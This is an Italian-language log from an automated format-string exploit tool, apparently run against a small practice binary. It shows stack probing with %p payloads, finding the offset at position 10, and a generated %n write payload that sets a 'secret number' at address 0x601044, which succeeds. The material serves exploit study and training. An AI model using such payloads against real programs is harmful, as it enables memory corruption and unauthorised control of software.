Byte da scrivere: 4
Dimensione indirizzi: 8 byte
Endian: little

Input da linea di comando: []
Input da passare durante l'esecuzione: [{'type': 'execution_input', 'marker': None, 'value': 'PPPP', 'free': True}]
Preparazione indirizzi e scrittori: 
   Sottovalori da scrivere: | 10 | 
   Relative dimensioni di scrittura: [4]
   Relativi nuovi indirizzi target: | 0x601044 | 
   Scrittori: [['%10x', None, 'n']]


Inizio ricerca di input vulnerabili

Input in test: {'type': 'execution_input', 'marker': None, 'value': 'PPPP', 'free': True}
Input libero, verifica se exploitabile: input exploitabile
Verifica stampa della dimensione minima della stringa di exploit (13 caratteri): dimensione minima stampata
Definizione marcati per estrarre fmt nella risposta: ng, ms
Conteggio della dimensione effettiva dell'input (fino a 517 caratteri): 60 caratteri disponibili + 4 caratteri usati dai marcatori
Ricerca fmt su stack: 
   Stringa di ricerca: ngAAAAAAAA%1$p%2$p%3$p%4$p%5$p%6$p%7$p%8$p%9$p%10$p%11$p%12$pGms
   Valori esadecimali estratti: ['602260', '0', '0', '0', '0', '0', '4141000000000000', '4100414141414141', '41414141414141', '414141414141676e', '3225702431254141', '3425702433257024']
    Valore 1 -> 602260
    Valore 2 -> 0
    Valore 3 -> 0
    Valore 4 -> 0
    Valore 5 -> 0
    Valore 6 -> 0
    Valore 7 -> 4141000000000000
    Valore 8 -> 4100414141414141

   Verifica posizione:
   Stringa di conferma: ngBBBBBBBB%1$p%2$p%3$p%4$p%5$p%6$p%7$p%8$p%9$p%10$p%11$p%12$pGms
   Valori esadecimali estratti: ['602260', '0', '0', '0', '0', '0', '4141000000000000', '4100414141414141', '41414141414141', '424242424242676e', '3225702431254242', '3425702433257024']
   Pattern di conferma non trovato

   Stringa di ricerca: ngAAAAAAAA%8$p%9$p%10$p%11$p%12$p%13$p%14$p%15$p%16$p%17$pGGGGms
   Valori esadecimali estratti: ['4100414141414141', '41414141414141', '414141414141676e', '3925702438254141', '2570243031257024', '2432312570243131', '3125702433312570', '7024353125702434', '3731257024363125', '736d474747477024']
    Valore 8 -> 4100414141414141
    Valore 9 -> 41414141414141

   Verifica posizione:
   Stringa di conferma: ngBBBBBBBB%8$p%9$p%10$p%11$p%12$p%13$p%14$p%15$p%16$p%17$pGGGGms
   Valori esadecimali estratti: ['4100414141414141', '41414141414141', '424242424242676e', '3925702438254242', '2570243031257024', '2432312570243131', '3125702433312570', '7024353125702434', '3731257024363125', '736d474747477024']
   Pattern di conferma non trovato

   Stringa di ricerca: ngAAAAAAAA%9$p%10$p%11$p%12$p%13$p%14$p%15$p%16$p%17$p%18$pGGGms
   Valori esadecimali estratti: ['41414141414141', '414141414141676e', '3125702439254141', '7024313125702430', '3331257024323125', '2570243431257024', '2436312570243531', '3125702437312570', '736d474747702438', '4100000000400640']
    Valore 9 -> 41414141414141
    Valore 10 -> 414141414141676e
    Valore 11 -> 3125702439254141

   Verifica posizione:
   Stringa di conferma: ngBBBBBBBB%9$p%10$p%11$p%12$p%13$p%14$p%15$p%16$p%17$p%18$pGGGms
   Valori esadecimali estratti: ['41414141414141', '424242424242676e', '3125702439254242', '7024313125702430', '3331257024323125', '2570243431257024', '2436312570243531', '3125702437312570', '736d474747702438', '4100000000400640']
    Valore 10 -> 424242424242676e
    Valore 11 -> 3125702439254242
   Posizione 10
Generazione fmt per exploit nel formato 'scrittori-indirizzi': 
   Scrittori: [['%10x', '%012$', 'n']]
   Padding di allineamento: '......'
   Generazione completata con successo
La stringa generata è: 
		b'%10x%012$n......D\x10`\x00\x00\x00\x00\x00'
Inizio exploit: La risposta è:
----------------------------------------
Ciao     602260......D`Hai assegnato il numero corretto al numero segreto

----------------------------------------
